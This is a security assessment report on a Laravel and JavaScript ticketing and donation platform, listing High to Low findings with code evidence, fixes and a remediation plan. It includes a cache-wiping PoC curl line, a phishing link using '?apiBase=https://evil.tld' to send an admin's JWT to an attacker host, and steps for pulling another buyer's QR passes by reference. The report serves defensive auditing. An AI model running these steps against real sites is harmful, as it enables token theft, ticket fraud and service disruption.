# Security Assessment Report — ROI_web, 2026-08-25

> **REMEDIATION STATUS (2026-08-26): ALL FINDINGS REMEDIATED AND VERIFIED.**
> Every finding below (3 High, 5 Medium, 6 Low) was fixed across nine implementation waves, each wave independently verified by a fresh-context adversarial review agent plus Playwright dynamic testing. Final state: `php artisan test` → **128 passed / 617 assertions** (was 111; +17 regression tests added), frontend Node suite **17/17**, `composer audit` clean, full-journey browser E2E green (home → events → checkout → email-gated order page → admin login → dashboard, zero CSP violations).
>
> Notable extras discovered and fixed during remediation: pre-existing latent crash in `PaystackService` (missing exception import, first error-path execution would fatal); Laravel's unnamed `throttle:N,M` sharing one IP bucket across all routes (all converted to isolated named limiters); volunteer availability checkboxes double-toggling (form was unsubmittable via mouse/touch — also made keyboard-accessible); broken Node test assertion aligned with the L-3 allowlist.
>
> **Current deployment checklist:** set `ENVIRONMENT=production` (never leave development), ensure `ALLOW_DEV_PAYMENT_BYPASSES` is unset/false (production refuses to boot with it), rotate the seeded demo admin password to a modern Laravel password hash, and follow the current README/API key guide for the password-only admin login. TOTP/MFA references in the archived finding text below describe the pre-remediation state and are no longer part of the implemented login flow.

## Executive summary

White-box audit of the full stack (Laravel 13 API + vanilla JS SPA). Overall posture is **moderately strong for a hand-built platform** — server-side pricing, locked inventory transactions, consistent `hash_equals` use, production boot guards, and clean dependency/history scans. The risk is concentrated in three places:

1. **The SPA ships in permissive demo mode** (`ROI_STRICT_API_MODE` commented out in every deployed build), fabricating "Completed" ticket orders and donation confirmations during outages.
2. **A public endpoint can wipe the media cache and burn YouTube quota** (`GET /api/youtube/channel-videos?refresh=1` → `MediaItem` table delete + live API calls).
3. **Order references are the only secret** protecting buyer PII and printable QR ticket passes (32-bit entropy, no email confirmation on several endpoints).

Counts: 3 High, 5 Medium, 6 Low, plus observations.

**Most urgent fixes:** enable strict API mode in the production build; require admin auth (or at minimum a signed cache-bypass) for `channel-videos?refresh`; gate `pass`/`showOrder`/`resend` behind email confirmation or portal tokens and raise reference entropy to 16 bytes.

## Scope & methodology

- Targets: entire repository (77 routes: ~40 public, 36 admin-only; 40 frontend source files; docker/deploy configs).
- Mode: white-box static analysis + code-path tracing. No live target was running; dynamic PoCs were not executed — findings marked CONFIRMED are verified at source level with exact file:line evidence.
- Tooling: manual review of all controllers/services/middleware/routes, two parallel recon passes (backend attack surface, frontend sink tracing), `composer audit`, git-history secret scan, config review.
- Not covered: runtime behavior under load, Supabase/production infra (schema file reviewed only as reference), email deliverability internals.

## Findings

### [HIGH] H-1 — Production builds ship with demo-fallback engine enabled, fabricating successful payments
- **Target/Endpoint:** `frontend/index.html:27`, `frontend/dist/index.html:27`, `laravel-backend/public/index.html` · `frontend/src/js/api.js:14`
- **CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L → **7.1** (systemic integrity failure of money-flow records during any API outage)
- **CWE:** CWE-841 (improper enforcement of behavioral workflow)
- **Description:** `window.ROI_STRICT_API_MODE = true` is commented out in every shipped HTML shell, so `STRICT_API_MODE === false` in production. The fallback engine returns synthetic success payloads on any API failure.
- **Technical analysis:**
  ```js
  // api.js:73-86 — non-strict mode swallows ALL failures and serves fallback data
  ```
  - `checkoutTickets` (api.js:138–158): fake order `status:'Completed'`, codes `ROI-OFFL-0001…`
  - `initiateDonation` (api.js:191–198): fake `ROI-SIM-*` reference, "Pledge recorded offline."
  - `volunteer.js:216–222` and `contact.js:159–163`: **catch branches render success overlays**
- **PoC (steps):** Build the SPA (`npm run build`), stop the Laravel API, open the site, submit a ticket checkout → UI shows a completed order with plausible ticket codes that exist nowhere in the database.
- **Impact:** Real buyers receive "Completed" tickets that will fail at the gate; donations appear recorded but never reach Paystack/M-Pesa. Direct financial and reputational damage to an NGO selling event tickets.
- **Fix:** Set strict mode in the build (uncomment line 27 in both shells, or inject from env at build time); delete the fabricated-success branches so failures surface as errors.
- **Fix effort:** trivial

### [HIGH] H-2 — Unauthenticated media-cache wipe + YouTube quota burn via public refresh flag
- **Target/Endpoint:** `GET /api/youtube/channel-videos?refresh=true` (routes/api.php:75) · `MediaController.php:41-45` · `YouTubeSyncService.php` (forceRefresh branch)
- **CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H → **7.4** (anonymous destructive write; repeated wipes keep the media feature unavailable)
- **CWE:** CWE-862 (missing authorization)
- **Description:** The only fully public write-capable endpoint in the app: anyone can pass `refresh=true`, which deletes all rows from `MediaItem` and makes two live YouTube Data API calls (~100 quota units).
- **Technical analysis:**
  ```php
  $refresh = filter_var($request->query('refresh', 'false'), FILTER_VALIDATE_BOOL);
  $syncResult = $this->youtube->fetchAndCacheChannelVideos(forceRefresh: $refresh); // MediaController.php:43-45
  ...
  if ($forceRefresh) { MediaItem::query()->delete(); }   // YouTubeSyncService.php:62-64
  ```
  Admin-curated fields (featured flags, summaries) are destroyed until re-sync. The sibling cron-sync endpoint was hardened with `YOUTUBE_CRON_SECRET`; this one was not. Throttle is the global 120/min/IP only.
- **PoC (steps):** `curl 'https://host/api/youtube/channel-videos?refresh=true'` — repeat from a few IPs; quota exhausts and every page load degrades.
- **Impact:** Anonymous denial of the media hub + destruction of curated data + burning the channel's YouTube API quota (default 10k units/day ≈ 100 refreshes).
- **Fix:** Require the admin JWT (or the existing cron secret) whenever `refresh=1`; serve cached rows unauthenticated without the wipe.
- **Fix effort:** low

### [HIGH→MEDIUM boundary, filed HIGH] H-3 — Order reference is the sole credential for PII, QR passes, and re-delivery
- **Target/Endpoint:** `TicketController::showOrder/verifyOrder/pass/resend` (TicketController.php:70-146), `lookupTicket` (:174-182) · entropy: `PaystackService::makeReference` (PaystackService.php:106-110)
- **CVSS 3.1:** AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L → **5.9** (references leak via URLs, browser history, server logs; pure brute force impractical behind 120/min/IP)
- **CWE:** CWE-639 (authorization on an insecure object identifier)
- **Description:** Four public endpoints return full buyer name/email/order contents — and `/pass` renders an HTML pass with QR codes for **every ticket in the order** — keyed only on `{reference}`, no email confirmation. References are `ROI-TCK-` + 8 hex chars (32 bits).
- **Technical analysis:**
  ```php
  $order = TicketOrder::where('reference', $reference)->first();   // TicketController.php:72, no other check
  return response()->view('tickets.pass', [...]);                  // :142 — QR passes for all tickets
  ```
  Contrast: `lookup-order` (:235-255) correctly requires email+reference. `resend` also lets a holder re-email tickets to the victim's stored address (mail-bombing primitive).
- **PoC (steps):** Obtain any reference (shared link, log access, Referer leak) → `GET /api/tickets/orders/{ref}/pass` → printable QR passes for someone else's tickets.
- **Impact:** Buyer PII disclosure; ticket fraud (attacker presents QR at the gate before the buyer).
- **Fix:** Require email confirmation (reuse the lookup-order pattern) or mint a portal token for these routes; raise reference entropy to `random_bytes(16)`; rate-limit `lookup/{code}` separately.
- **Fix effort:** medium

### [MEDIUM] M-1 — Unthrottled money endpoints: checkout DB/gateway flooding and STK SMS bombing
- **Target/Endpoint:** `POST /api/payments/checkout` (routes/api.php:65 — no dedicated throttle), `POST /api/tickets/orders/{ref}/stk-retry` (routes/api.php:57)
- **CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L → **5.4**
- **CWE:** CWE-770 / CWE-799
- **Description:** Every other form endpoint has `throttle:8–20/min`; checkout and stk-retry have none beyond global 120/min/IP. Each checkout inserts a `Donation` row and invokes live Paystack/Daraja APIs; `retryStk` fires M-Pesa prompts at a **caller-supplied phone number** (`$data['buyer_phone'] ?? null`, TicketController.php:156-163 → TicketService.php:227) for any pending order.
- **Impact:** DB flooding, gateway abuse/bans, SMS-prompt harassment of arbitrary Kenyan phone numbers.
- **Fix:** `throttle:10,1` on both; cap STK retries per order per hour; ignore caller-supplied phone unless it matches the order's stored buyer_phone.
- **Fix effort:** low

### [MEDIUM] M-2 — Environment-flag fail-open cluster around payments
- **Target/Endpoint:** `PaymentController.php:55-57,135-145,260` · `TicketController.php:92-95` · `MpesaService.php:176-186` · `MediaController.php:32-35` · gate: `config/roi.php:8` (`ENVIRONMENT`)
- **CVSS 3.1:** AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N → **5.9** (conditional on misconfiguration)
- **CWE:** CWE-1188 (insecure default initialization)
- **Description:** In dev/test mode: `/payments/verify/{ref}` marks donations Completed and fulfills ticket orders **without contacting the gateway**; unsigned Paystack webhooks are accepted when no secret is configured; M-Pesa callbacks need no token. A single variable (`ENVIRONMENT`) gates all of it — set wrong at deploy, this becomes free-ticket forgery.
- **Mitigations already present:** production fails closed on all four paths, and boot guards refuse weak JWT secrets/demo password/debug in production (`AppServiceProvider.php:57-106`). Risk is operational, not code-defect per se.
- **Fix:** Invert defaults (fail-closed always; opt-in dev bypass via an explicit separate flag); add a startup warning when live gateway keys (`sk_live…`, Daraja passkey) are present while `ENVIRONMENT != production`.
- **Fix effort:** medium

### [MEDIUM] M-3 — Frontend token-theft chain: localStorage JWT + client-controlled `?apiBase=` + no CSP
- **Target/Endpoint:** `frontend/src/js/api.js:9-12,23,33` · `storage.js` · absence of CSP meta in all HTML shells
- **CVSS 3.1:** AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N → **6.4** (requires phishing click)
- **CWE:** CWE-601-adjacent / CWE-693
- **Description:** `BASE_URL` accepts `?apiBase=https://evil.tld` from the URL; the Bearer token rides on **every** request including public ones; token lives in `localStorage`. One phishing link makes the victim's browser ship their admin JWT cross-origin (attacker's server answers CORS preflight).
- **Fix:** Drop the query-param override (build-time constant only); attach Authorization only to `/admin/*` requests; add a CSP meta tag.
- **Fix effort:** low

### [MEDIUM] M-4 — Admin login factor hygiene: MFA seed hint in UI, enumeration oracle, unsalted SHA-256 primary hash
- **Target/Endpoint:** `frontend/src/js/pages/adminLogin.js:29,54,82` · `AuthController.php:42-75` · `PasswordService.php:14-25`
- **CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N → **5.3** composite
- **CWE:** CWE-204 (enumeration) / CWE-916 (weak password hashing)
- **Details (three related issues filed together by root cause — single login flow):**
  1. Login page prints the fixed admin email and an MFA hint ("the 2026 PRD seed configuration is `2026`") — hands an attacker 2-of-3 factors visually; README also publishes the dev TOTP seed.
  2. Distinct 401 messages per stage (email whitelist vs TOTP vs password) confirm which factor failed; TOTP has ±1-window tolerance and no lockout (only route throttle 5/min/IP) — distributed guessing feasible.
  3. Primary password scheme is unsalted SHA-256 hex compared with `===` (not `hash_equals`); bcrypt fallback exists but no rehash-on-login migration. Boot refusal of the demo hash mitigates the worst case.
- **Fix:** Remove the hint/fixed email from markup; unify 401 responses; add TOTP attempt lockout; migrate to bcrypt/Argon2 with silent rehash on login.
- **Fix effort:** medium

### [LOW]
| # | Finding | Location | Note |
|---|---|---|---|
| L-1 | Portal-token HMAC secret falls back to constant `'roi-ticket-portal'` | `TicketPortalService.php:60-63` | Reachable only if both `JWT_SECRET_KEY` and `APP_KEY` are empty — blocked by prod boot guard; remove the constant |
| L-2 | Latent DOM XSS sink: raw `/health`,`/ready` JSON interpolated into innerHTML | `frontend/src/js/pages/status.js:32-34` | Only exploitable if health payload ever reflects input; escape it |
| L-3 | Server-controlled redirect: `window.open(res.authorization_url)` unvalidated; ticket-side check accepts any http(s) URL | `donationModal.js:356-358`, `tickets.js:211-214`, `ticketPayment.js:24-27` | Open-redirect/XSS primitive on backend compromise; allowlist paystack.co |
| L-4 | M-Pesa webhook token travels as URL query param | `PaymentController.php:185` | Leaks into access logs; move to header if Daraja config allows |
| L-5 | CORS ships placeholder origin `https://yourdomain.com` with `supports_credentials => true` | `config/cors.php:11-17,31` | No-op same-origin today; clean up before split deployment |
| L-6 | Demo volunteers/inquiries (fabricated PII) render in admin dashboard and CSV export when API lists are empty | `adminDashboard.js:12-21,404,643,747,1077-1083` | Operational/trust risk — export could mix fake records into real data |

## Attack chains demonstrated (static)

1. **Phishing → full admin:** send admin `https://site/?apiBase=https://evil.tld` → their browser POSTs login (or replays stored JWT from localStorage) to attacker origin → attacker holds 8h global-admin JWT (no revocation, synthetic-admin path means DB row not even required) → 36 admin endpoints incl. volunteer PII CSV export.
2. **Reference leak → gate entry:** reference appears in any shared/logged URL → `/tickets/orders/{ref}/pass` → print victim's QR passes → checked in ahead of buyer while buyer's tickets show "already used".
3. **Mis-set ENVIRONMENT → free tickets:** deploy with `ENVIRONMENT=development` → anonymous `POST /tickets/checkout` then `GET /tickets/orders/{ref}/verify` auto-fulfills paid orders without payment.

## Observations (non-vulnerabilities)

- **Good practices confirmed:** escaping discipline across 86 innerHTML sinks (single real miss = L-2); server-authoritative pricing and `lockForUpdate` inventory math (TicketService.php:32-101); `hash_equals` on every shared-secret comparison; security headers incl. HSTS in prod; CSV formula-injection neutralization (AdminController.php:266-273); anti-enumeration recovery endpoint; composer audit clean (0 advisories); no real secrets in git history (only placeholders `sk_live_SUPERSECRET`/`sk_test_acceptance`); `.env` correctly gitignored and never committed.
- **Hygiene:** working-tree `.env` contains what appear to be **live** Paystack/Daraja/YouTube credentials in plaintext — never commit them, keep them out of Docker images/backups, and rotate if this machine is shared. `.legacy/` contains an uncommitted frontend tarball — scan before archiving anywhere.
- Client-side `#/admin` gating is presence-of-localStorage-string only — acceptable as UX since the backend enforces `roi.admin` on all 36 admin routes (verified in routes/api.php:78-127), but demo-data fallbacks make the empty dashboard look real (see L-6).

## Prioritized remediation plan

1. **Today:** enable `ROI_STRICT_API_MODE` in shipped HTML (H-1); add throttle + retry caps to checkout/stk-retry (M-1); require auth for media refresh (H-2).
2. **This week:** email-gate the four reference-keyed endpoints + bump reference entropy (H-3); strip the login-page hint and unify 401s (M-4); remove `?apiBase` override (M-3).
3. **Next sprint:** invert dev/test bypass defaults + live-key/environment mismatch warning (M-2); bcrypt migration with rehash-on-login (M-4c); LOW items as drive-by fixes.

## Coverage appendix

| Unit | Status |
|---|---|
| Route inventory & middleware mapping (77 routes) | tested-clean |
| JWT issuance/verification/alg confusion | tested-clean (alg pinned in Key; exp enforced) |
| Admin authorization model (36 routes) | tested-clean (uniform `roi.admin`; design concerns filed as M-3 chain) |
| Login flow (email/TOTP/password stages) | findings M-4 |
| Paystack init/verify/webhooks | findings M-2 |
| M-Pesa STK/callback/token | findings M-1, M-2, L-4 |
| Ticket checkout/inventory/concurrency | tested-clean (locks + server pricing correct) |
| Reference-keyed public endpoints | findings H-3 |
| Portal tokens / recovery | findings L-1 |
| YouTube sync endpoints | findings H-2 |
| Public intake forms (volunteer/contact/inquiries) | tested-clean (validated, throttled) |
| Admin CRUD + CSV exports | tested-clean (formula injection neutralized) |
| SQL usage (Eloquent throughout; two `whereRaw` uses parameterized) | tested-clean |
| File uploads | none exist (no upload routes) |
| Frontend XSS sinks (86 sites traced) | findings L-2, L-3, latent interpolations noted |
| Frontend secrets/backdoors | tested-clean |
| Secrets in repo/git history/.legacy | tested-clean (placeholders only; live creds in untracked .env flagged as hygiene) |
| Dependencies (composer.lock, npm) | composer: clean; frontend deps vendored/minified, no advisory sweep possible offline |
| Docker/compose | tested-clean (dev-oriented; env_file plaintext note) |
| Dynamic exploitation | NOT PERFORMED — no running instance; all findings are statically verified code paths |
